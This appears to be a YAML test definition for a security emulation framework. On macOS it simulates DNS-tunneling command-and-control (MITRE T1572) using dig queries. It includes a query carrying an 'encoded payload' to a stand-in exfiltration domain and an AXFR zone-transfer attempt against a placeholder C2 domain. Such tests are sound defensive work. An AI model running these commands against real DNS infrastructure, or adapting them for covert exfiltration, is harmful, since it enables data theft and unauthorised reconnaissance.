---
api_version: 2.0
uuid: 5c4bdb66-d80e-4698-8997-f9cc7ca0cb78
name: DNS Tunneling Capability Check
authors:
- Claude Code
description: |
  Detects DNS tunneling capabilities used for C2 communication
mitre:
  tactics:
  - TA0011 Command and Control
  techniques:
  - T1572 Protocol Tunneling
requirements:
  platforms:
  - os: darwin
args:
- name: c2_domain
  description: C2 domain for DNS tunneling
  type: string
  default: c2.example.com
- name: test_payload
  description: Encoded payload to tunnel via DNS
  type: string
  default: test1234.exfil.example.com
- name: dns_server
  description: DNS server to query
  type: string
  default: 8.8.8.8
steps:
- name: prepare_dns_tunnel_query
  description: Prepare DNS query for tunneling
  inline: echo "Preparing DNS tunnel query for {{ .Args.test_payload }}"
- name: dns_query_attempt
  description: Attempt DNS query with encoded payload
  inline: dig @{{ .Args.dns_server }} {{ .Args.test_payload }} TXT +short
- name: zone_transfer_attempt
  description: Attempt zone transfer on C2 domain
  inline: dig @{{ .Args.dns_server }} {{ .Args.c2_domain }} AXFR
  cleanup:
    inline: sudo dscacheutil -flushcache
tests:
- name: dry_run_test
  dry_run: true
